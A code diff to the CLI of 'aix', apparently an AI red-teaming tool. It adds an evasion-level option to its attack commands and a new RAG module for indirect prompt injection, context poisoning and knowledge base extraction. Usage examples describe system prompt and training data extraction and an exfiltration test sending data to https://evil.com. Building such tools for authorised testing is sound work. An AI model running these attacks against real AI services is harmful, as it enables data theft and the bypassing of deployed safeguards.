@@ -18,7 +18,7 @@ from rich.console import Console
 from aix import __version__
 from aix.core.request_parser import RequestParseError, load_request
 from aix.db.database import AIXDatabase
-from aix.modules import agent, dos, exfil, extract, fuzz, inject, jailbreak, leak, memory, recon
+from aix.modules import agent, dos, exfil, extract, fuzz, inject, jailbreak, leak, memory, rag, recon
 
 console = Console()
 
@@ -128,11 +128,12 @@ def main(ctx, version):
 @click.option('--eval-key', help='API key for secondary LLM')
 @click.option('--eval-model', help='Model for secondary LLM')
 @click.option('--eval-provider', help='Provider for secondary LLM (openai, anthropic, ollama, gemini)')
+@click.option('--evasion', '-e', type=click.Choice(['none', 'light', 'aggressive']), default='none', help='Evasion level')
 @click.option('--level', default=1, help='Level of tests to perform (1-5)')
 @click.option('--risk', default=1, help='Risk of tests to perform (1-3)')
 @click.option('--show-response', is_flag=True, help='Show AI response for findings')
 @click.option('--verify-attempts', '-va', default=1, help='Number of verification attempts (confirmation)')
-def recon_cmd(target, request, param, output, timeout, verbose, proxy, cookie, headers, format, refresh_url, refresh_regex, refresh_param, refresh_error, response_regex, eval_url, eval_key, eval_model, eval_provider, level, risk, show_response, verify_attempts):
+def recon_cmd(target, request, param, output, timeout, verbose, proxy, cookie, headers, format, refresh_url, refresh_regex, refresh_param, refresh_error, response_regex, eval_url, eval_key, eval_model, eval_provider, evasion, level, risk, show_response, verify_attempts):
     """
     Reconnaissance - Discover AI endpoint details
 
@@ -152,7 +153,7 @@ def recon_cmd(target, request, param, output, timeout, verbose, proxy, cookie, h
     """
     print_banner()
     target, parsed_request = validate_input(target, request, param)
-    recon.run(target, output=output, timeout=timeout, verbose=verbose,
+    recon.run(target, output=output, timeout=timeout, verbose=verbose, evasion=evasion,
               parsed_request=parsed_request, proxy=proxy, cookies=cookie, headers=headers,
               injection_param=param, body_format=format,
               refresh_config={'url': refresh_url, 'regex': refresh_regex, 'param': refresh_param, 'error': refresh_error},
@@ -323,11 +324,12 @@ main.add_command(jailbreak_cmd, name='jailbreak')
 @click.option('--eval-key', help='API key for secondary LLM')
 @click.option('--eval-model', help='Model for secondary LLM')
 @click.option('--eval-provider', help='Provider for secondary LLM (openai, anthropic, ollama, gemini)')
+@click.option('--evasion', '-e', type=click.Choice(['none', 'light', 'aggressive']), default='none', help='Evasion level')
 @click.option('--level', default=1, help='Level of tests to perform (1-5)')
 @click.option('--risk', default=1, help='Risk of tests to perform (1-3)')
 @click.option('--show-response', is_flag=True, help='Show AI response for findings')
 @click.option('--verify-attempts', '-va', default=1, help='Number of verification attempts (confirmation)')
-def extract_cmd(target, request, param, key, profile, verbose, output, proxy, cookie, headers, format, refresh_url, refresh_regex, refresh_param, refresh_error, response_regex, eval_url, eval_key, eval_model, eval_provider, level, risk, show_response, verify_attempts):
+def extract_cmd(target, request, param, key, profile, verbose, output, proxy, cookie, headers, format, refresh_url, refresh_regex, refresh_param, refresh_error, response_regex, eval_url, eval_key, eval_model, eval_provider, evasion, level, risk, show_response, verify_attempts):
     """
     Extract - System prompt extraction
 
@@ -342,13 +344,13 @@ def extract_cmd(target, request, param, key, profile, verbose, output, proxy, co
     Examples:
         aix extract https://api.target.com -k sk-xxx
         aix extract -r request.txt -p "messages[0].content"
-        aix extract --profile company.com
+        aix extract --profile company.com --evasion aggressive
     """
     print_banner()
     target, parsed_request = validate_input(target, request, param)
     extract.run(
         target=target, api_key=key, profile=profile,
-        verbose=verbose, output=output,
+        verbose=verbose, output=output, evasion=evasion,
         parsed_request=parsed_request, proxy=proxy, cookies=cookie, headers=headers,
         injection_param=param, body_format=format,
         refresh_config={'url': refresh_url, 'regex': refresh_regex, 'param': refresh_param, 'error': refresh_error},
@@ -385,11 +387,12 @@ main.add_command(extract_cmd, name='extract')
 @click.option('--eval-key', help='API key for secondary LLM')
 @click.option('--eval-model', help='Model for secondary LLM')
 @click.option('--eval-provider', help='Provider for secondary LLM (openai, anthropic, ollama, gemini)')
+@click.option('--evasion', '-e', type=click.Choice(['none', 'light', 'aggressive']), default='none', help='Evasion level')
 @click.option('--level', default=1, help='Level of tests to perform (1-5)')
 @click.option('--risk', default=1, help='Risk of tests to perform (1-3)')
 @click.option('--show-response', is_flag=True, help='Show AI response for findings')
 @click.option('--verify-attempts', '-va', default=1, help='Number of verification attempts (confirmation)')
-def leak_cmd(target, request, param, key, profile, verbose, output, proxy, cookie, headers, format, refresh_url, refresh_regex, refresh_param, refresh_error, response_regex, eval_url, eval_key, eval_model, eval_provider, level, risk, show_response, verify_attempts):
+def leak_cmd(target, request, param, key, profile, verbose, output, proxy, cookie, headers, format, refresh_url, refresh_regex, refresh_param, refresh_error, response_regex, eval_url, eval_key, eval_model, eval_provider, evasion, level, risk, show_response, verify_attempts):
     """
     Leak - Training data extraction
 
@@ -404,13 +407,13 @@ def leak_cmd(target, request, param, key, profile, verbose, output, proxy, cooki
     Examples:
         aix leak https://api.target.com -k sk-xxx
         aix leak -r request.txt -p "messages[0].content"
-        aix leak --profile company.com
+        aix leak --profile company.com --evasion aggressive
     """
     print_banner()
     target, parsed_request = validate_input(target, request, param)
     leak.run(
         target=target, api_key=key, profile=profile,
-        verbose=verbose, output=output,
+        verbose=verbose, output=output, evasion=evasion,
         parsed_request=parsed_request, proxy=proxy, cookies=cookie, headers=headers,
         injection_param=param, body_format=format,
         refresh_config={'url': refresh_url, 'regex': refresh_regex, 'param': refresh_param, 'error': refresh_error},
@@ -443,11 +446,12 @@ main.add_command(leak_cmd, name='leak')
 @click.option('--eval-key', help='API key for secondary LLM')
 @click.option('--eval-model', help='Model for secondary LLM')
 @click.option('--eval-provider', help='Provider for secondary LLM (openai, anthropic, ollama, gemini)')
+@click.option('--evasion', '-e', type=click.Choice(['none', 'light', 'aggressive']), default='none', help='Evasion level')
 @click.option('--level', default=1, help='Level of tests to perform (1-5)')
 @click.option('--risk', default=1, help='Risk of tests to perform (1-3)')
 @click.option('--show-response', is_flag=True, help='Show AI response for findings')
 @click.option('--verify-attempts', '-va', default=1, help='Number of verification attempts (confirmation)')
-def exfil_cmd(target, request, param, key, profile, webhook, verbose, output, proxy, cookie, headers, format, eval_url, eval_key, eval_model, eval_provider, level, risk, show_response, verify_attempts):
+def exfil_cmd(target, request, param, key, profile, webhook, verbose, output, proxy, cookie, headers, format, eval_url, eval_key, eval_model, eval_provider, evasion, level, risk, show_response, verify_attempts):
     """
     Exfil - Data exfiltration testing
 
@@ -462,13 +466,13 @@ def exfil_cmd(target, request, param, key, profile, webhook, verbose, output, pr
     Examples:
         aix exfil https://api.target.com -k sk-xxx --webhook https://evil.com
         aix exfil -r request.txt -p "messages[0].content"
-        aix exfil --profile company.com
+        aix exfil --profile company.com --evasion aggressive
     """
     print_banner()
     target, parsed_request = validate_input(target, request, param)
     exfil.run(
         target=target, api_key=key, profile=profile, webhook=webhook,
-        verbose=verbose, output=output,
+        verbose=verbose, output=output, evasion=evasion,
         parsed_request=parsed_request, proxy=proxy, cookies=cookie, headers=headers,
         injection_param=param, body_format=format,
         eval_config={'url': eval_url, 'api_key': eval_key, 'model': eval_model, 'provider': eval_provider},
@@ -503,11 +507,12 @@ main.add_command(exfil_cmd, name='exfil')
 @click.option('--eval-key', help='API key for secondary LLM')
 @click.option('--eval-model', help='Model for secondary LLM')
 @click.option('--eval-provider', help='Provider for secondary LLM (openai, anthropic, ollama, gemini)')
+@click.option('--evasion', '-e', type=click.Choice(['none', 'light', 'aggressive']), default='none', help='Evasion level')
 @click.option('--level', default=1, help='Level of tests to perform (1-5)')
 @click.option('--risk', default=1, help='Risk of tests to perform (1-3)')
 @click.option('--show-response', is_flag=True, help='Show AI response for findings')
 @click.option('--verify-attempts', '-va', default=1, help='Number of verification attempts (confirmation)')
-def agent_cmd(target, request, param, key, profile, verbose, output, proxy, cookie, headers, format, refresh_url, refresh_regex, refresh_param, refresh_error, response_regex, eval_url, eval_key, eval_model, eval_provider, level, risk, show_response, verify_attempts):
+def agent_cmd(target, request, param, key, profile, verbose, output, proxy, cookie, headers, format, refresh_url, refresh_regex, refresh_param, refresh_error, response_regex, eval_url, eval_key, eval_model, eval_provider, evasion, level, risk, show_response, verify_attempts):
     """
     Agent - AI agent exploitation
 
@@ -522,13 +527,13 @@ def agent_cmd(target, request, param, key, profile, verbose, output, proxy, cook
     Examples:
         aix agent https://agent.target.com -k sk-xxx
         aix agent -r request.txt -p "messages[0].content"
-        aix agent --profile company.com
+        aix agent --profile company.com --evasion aggressive
     """
     print_banner()
     target, parsed_request = validate_input(target, request, param)
     agent.run(
         target=target, api_key=key, profile=profile,
-        verbose=verbose, output=output,
+        verbose=verbose, output=output, evasion=evasion,
         parsed_request=parsed_request, proxy=proxy, cookies=cookie, headers=headers,
         injection_param=param, body_format=format,
         refresh_config={'url': refresh_url, 'regex': refresh_regex, 'param': refresh_param, 'error': refresh_error},
@@ -565,11 +570,12 @@ main.add_command(agent_cmd, name='agent')
 @click.option('--eval-key', help='API key for secondary LLM')
 @click.option('--eval-model', help='Model for secondary LLM')
 @click.option('--eval-provider', help='Provider for secondary LLM (openai, anthropic, ollama, gemini)')
+@click.option('--evasion', '-e', type=click.Choice(['none', 'light', 'aggressive']), default='none', help='Evasion level')
 @click.option('--level', default=1, help='Level of tests to perform (1-5)')
 @click.option('--risk', default=1, help='Risk of tests to perform (1-3)')
 @click.option('--show-response', is_flag=True, help='Show AI response for findings')
 @click.option('--verify-attempts', '-va', default=1, help='Number of verification attempts (confirmation)')
-def dos_cmd(target, request, param, key, profile, verbose, output, proxy, cookie, headers, format, refresh_url, refresh_regex, refresh_param, refresh_error, response_regex, eval_url, eval_key, eval_model, eval_provider, level, risk, show_response, verify_attempts):
+def dos_cmd(target, request, param, key, profile, verbose, output, proxy, cookie, headers, format, refresh_url, refresh_regex, refresh_param, refresh_error, response_regex, eval_url, eval_key, eval_model, eval_provider, evasion, level, risk, show_response, verify_attempts):
     """
     DoS - Denial of Service testing
 
@@ -584,13 +590,13 @@ def dos_cmd(target, request, param, key, profile, verbose, output, proxy, cookie
     Examples:
         aix dos https://api.target.com -k sk-xxx
         aix dos -r request.txt -p "messages[0].content"
-        aix dos --profile company.com
+        aix dos --profile company.com --evasion aggressive
     """
     print_banner()
     target, parsed_request = validate_input(target, request, param)
     dos.run(
         target=target, api_key=key, profile=profile,
-        verbose=verbose, output=output,
+        verbose=verbose, output=output, evasion=evasion,
         parsed_request=parsed_request, proxy=proxy, cookies=cookie, headers=headers,
         injection_param=param, body_format=format,
         refresh_config={'url': refresh_url, 'regex': refresh_regex, 'param': refresh_param, 'error': refresh_error},
@@ -627,11 +633,12 @@ main.add_command(dos_cmd, name='dos')
 @click.option('--eval-key', help='API key for secondary LLM')
 @click.option('--eval-model', help='Model for secondary LLM')
 @click.option('--eval-provider', help='Provider for secondary LLM (openai, anthropic, ollama, gemini)')
+@click.option('--evasion', '-e', type=click.Choice(['none', 'light', 'aggressive']), default='none', help='Evasion level')
 @click.option('--level', default=1, help='Level of tests to perform (1-5)')
 @click.option('--risk', default=1, help='Risk of tests to perform (1-3)')
 @click.option('--show-response', is_flag=True, help='Show AI response for findings')
 @click.option('--verify-attempts', '-va', default=1, help='Number of verification attempts (confirmation)')
-def fuzz_cmd(target, request, param, key, profile, iterations, verbose, output, proxy, cookie, headers, format, refresh_url, refresh_regex, refresh_param, refresh_error, response_regex, eval_url, eval_key, eval_model, eval_provider, level, risk, show_response, verify_attempts):
+def fuzz_cmd(target, request, param, key, profile, iterations, verbose, output, proxy, cookie, headers, format, refresh_url, refresh_regex, refresh_param, refresh_error, response_regex, eval_url, eval_key, eval_model, eval_provider, evasion, level, risk, show_response, verify_attempts):
     """
     Fuzz - Fuzzing and edge cases
 
@@ -646,13 +653,13 @@ def fuzz_cmd(target, request, param, key, profile, iterations, verbose, output, 
     Examples:
         aix fuzz https://api.target.com -k sk-xxx
         aix fuzz -r request.txt -p "messages[0].content"
-        aix fuzz --profile company.com --iterations 500
+        aix fuzz --profile company.com --iterations 500 --evasion aggressive
     """
     print_banner()
     target, parsed_request = validate_input(target, request, param)
     fuzz.run(
         target=target, api_key=key, profile=profile,
-        iterations=iterations, verbose=verbose, output=output,
+        iterations=iterations, verbose=verbose, output=output, evasion=evasion,
         parsed_request=parsed_request, proxy=proxy, cookies=cookie, headers=headers,
         injection_param=param, body_format=format,
         refresh_config={'url': refresh_url, 'regex': refresh_regex, 'param': refresh_param, 'error': refresh_error},
@@ -689,11 +696,12 @@ main.add_command(fuzz_cmd, name='fuzz')
 @click.option('--eval-key', help='API key for secondary LLM')
 @click.option('--eval-model', help='Model for secondary LLM')
 @click.option('--eval-provider', help='Provider for secondary LLM (openai, anthropic, ollama, gemini)')
+@click.option('--evasion', '-e', type=click.Choice(['none', 'light', 'aggressive']), default='none', help='Evasion level')
 @click.option('--level', default=1, help='Level of tests to perform (1-5)')
 @click.option('--risk', default=1, help='Risk of tests to perform (1-3)')
 @click.option('--show-response', is_flag=True, help='Show AI response for findings')
 @click.option('--verify-attempts', '-va', default=1, help='Number of verification attempts (confirmation)')
-def memory_cmd(target, request, param, key, profile, verbose, output, proxy, cookie, headers, format, refresh_url, refresh_regex, refresh_param, refresh_error, response_regex, eval_url, eval_key, eval_model, eval_provider, level, risk, show_response, verify_attempts):
+def memory_cmd(target, request, param, key, profile, verbose, output, proxy, cookie, headers, format, refresh_url, refresh_regex, refresh_param, refresh_error, response_regex, eval_url, eval_key, eval_model, eval_provider, evasion, level, risk, show_response, verify_attempts):
     """
     Memory - Memory and context manipulation attacks
 
@@ -712,13 +720,13 @@ def memory_cmd(target, request, param, key, profile, verbose, output, proxy, coo
     \b
     Examples:
         aix memory https://api.target.com -k sk-xxx
-        aix memory -r request.txt -p "messages[0].content"
+        aix memory -r request.txt -p "messages[0].content" --evasion aggressive
     """
     print_banner()
     target, parsed_request = validate_input(target, request, param)
     memory.run(
         target=target, api_key=key, profile=profile,
-        verbose=verbose, output=output,
+        verbose=verbose, output=output, evasion=evasion,
         parsed_request=parsed_request, proxy=proxy, cookies=cookie, headers=headers,
         injection_param=param, body_format=format,
         refresh_config={'url': refresh_url, 'regex': refresh_regex, 'param': refresh_param, 'error': refresh_error},
@@ -729,6 +737,71 @@ def memory_cmd(target, request, param, key, profile, verbose, output, proxy, coo
 
 
 main.add_command(memory_cmd, name='memory')
+
+
+# ============================================================================
+# RAG MODULE
+# ============================================================================
+@main.command()
+@click.argument('target', required=False)
+@click.option('--request', '-r', help='Request file (Burp Suite format)')
+@click.option('--param', '-p', help='Parameter path for injection (e.g., messages[0].content)')
+@click.option('--key', '-k', help='API key for direct API access')
+@click.option('--profile', '-P', help='Use saved profile')
+@click.option('--verbose', '-v', count=True, help='Verbose output (-v: reasons, -vv: debug)')
+@click.option('--output', '-o', help='Output file for results')
+@click.option('--proxy', help='Use HTTP proxy for outbound requests (host:port)')
+@click.option('--cookie', '-C', help='Cookies for authentication (key=value; ...)')
+@click.option('--headers', '-H', help='Custom headers (key:value; ...)')
+@click.option('--format', '-F', type=click.Choice(['json', 'form', 'multipart']), default='json', help='Request body format')
+@click.option('--refresh-url', help='URL to fetch new session ID if expired')
+@click.option('--refresh-regex', help='Regex to extract session ID from refresh response')
+@click.option('--refresh-param', help='Parameter to update with new session ID')
+@click.option('--refresh-error', help='String/Regex in response body that triggers refresh')
+@click.option('--response-regex', '-rr', help='Regex to extract specific content from response (matches last occurrence)')
+@click.option('--eval-url', help='URL for secondary LLM evaluation')
+@click.option('--eval-key', help='API key for secondary LLM')
+@click.option('--eval-model', help='Model for secondary LLM')
+@click.option('--eval-provider', help='Provider for secondary LLM (openai, anthropic, ollama, gemini)')
+@click.option('--evasion', '-e', type=click.Choice(['none', 'light', 'aggressive']), default='none', help='Evasion level')
+@click.option('--level', default=1, help='Level of tests to perform (1-5)')
+@click.option('--risk', default=1, help='Risk of tests to perform (1-3)')
+@click.option('--show-response', is_flag=True, help='Show AI response for findings')
+@click.option('--verify-attempts', '-va', default=1, help='Number of verification attempts (confirmation)')
+def rag_cmd(target, request, param, key, profile, verbose, output, proxy, cookie, headers, format, refresh_url, refresh_regex, refresh_param, refresh_error, response_regex, eval_url, eval_key, eval_model, eval_provider, evasion, level, risk, show_response, verify_attempts):
+    """
+    RAG - RAG-specific vulnerability testing
+
+    \b
+    Test RAG (Retrieval-Augmented Generation) vulnerabilities:
+    - Indirect prompt injection via documents
+    - Context poisoning attacks
+    - Source/citation manipulation
+    - Retrieval bypass techniques
+    - Knowledge base extraction
+    - Chunk boundary attacks
+
+    \b
+    Examples:
+        aix rag https://api.target.com -k sk-xxx
+        aix rag -r request.txt -p "messages[0].content"
+        aix rag --profile company.com --evasion aggressive
+    """
+    print_banner()
+    target, parsed_request = validate_input(target, request, param)
+    rag.run(
+        target=target, api_key=key, profile=profile,
+        verbose=verbose, output=output, evasion=evasion,
+        parsed_request=parsed_request, proxy=proxy, cookies=cookie, headers=headers,
+        injection_param=param, body_format=format,
+        refresh_config={'url': refresh_url, 'regex': refresh_regex, 'param': refresh_param, 'error': refresh_error},
+        response_regex=response_regex,
+        eval_config={'url': eval_url, 'api_key': eval_key, 'model': eval_model, 'provider': eval_provider},
+        level=level, risk=risk, show_response=show_response, verify_attempts=verify_attempts
+    )
+
+
+main.add_command(rag_cmd, name='rag')
 
 
 # ============================================================================
@@ -835,6 +908,7 @@ def scan(target, request, param, key, profile, evasion, output, verbose, proxy, 
         ('leak', leak),
         ('exfil', exfil),
         ('memory', memory),
+        ('rag', rag),
     ]
 
     for name, module in modules_to_run:
@@ -842,7 +916,7 @@ def scan(target, request, param, key, profile, evasion, output, verbose, proxy, 
         try:
             module.run(
                 target=target, api_key=key, profile=profile,
-                verbose=verbose,
+                verbose=verbose, evasion=evasion,
                 parsed_request=parsed_request, proxy=proxy, cookies=cookie, headers=headers,
                 injection_param=param, body_format=format,
                 refresh_config={'url': refresh_url, 'regex': refresh_regex, 'param': refresh_param, 'error': refresh_error},
